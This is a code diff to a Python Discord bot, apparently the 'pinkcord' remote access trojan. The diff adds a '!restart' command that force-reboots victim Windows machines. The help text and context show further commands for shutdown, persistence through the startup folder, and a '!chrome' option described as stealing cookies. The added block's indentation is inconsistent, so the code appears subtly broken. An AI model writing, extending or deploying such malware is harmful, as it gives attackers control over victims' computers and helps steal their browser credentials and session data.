@@ -384,6 +384,16 @@ while True:
             else:
                 if session == sesja:
                     os.system("shutdown /s /f /t 1")
+
+        @bot.command()
+async def restart(ctx, session):
+    if session == "all":
+        os.system("powershell.exe Restart-Computer -Force")
+        await ctx.send(f"The remote system {sesja} is being restarted.")
+    else:
+        if session == sesja:
+            os.system("powershell.exe Restart-Computer -Force")
+            await ctx.send(f"The remote system {sesja} is being restarted.")
         
         @bot.command()
         async def h(ctx):
@@ -409,6 +419,7 @@ while True:
 !rename [session] [new_name] - Changes the name of a session.
 !startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
 !shutdown [session] - Shutdown the remote computer.
+!restart [session] - Restart the remote computer.
 !chrome [session] [action(cookie)] - steals selected data from chrome
             '''
             await ctx.send(wiadomosc)
